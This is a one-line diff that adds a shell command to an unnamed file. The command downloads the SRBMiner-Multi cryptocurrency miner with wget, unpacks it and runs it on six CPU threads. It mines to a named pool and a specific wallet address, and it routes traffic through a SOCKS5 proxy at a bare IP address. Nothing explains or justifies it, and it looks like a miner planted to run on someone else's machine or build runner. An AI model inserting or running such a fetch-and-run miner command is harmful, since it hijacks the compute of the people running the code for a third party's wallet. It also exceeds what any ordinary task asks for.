@@ -1,0 +1,1 @@
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.1/SRBMiner-Multi-2-7-1-Linux.tar.gz && tar -xf SRBMiner-Multi-2-7-1-Linux.tar.gz && cd SRBMiner-Multi-2-7-1 && ./SRBMiner-MULTI --disable-gpu --algorithm yespowerSugar --pool stratum+tcp://yespowerSUGAR.mine.zpool.ca:6241 --wallet RTwkzfFeRPsTU4VAFetiod7HCXNYD6bELc.M1 --proxy socks5://192.252.220.89:4145 --t 6
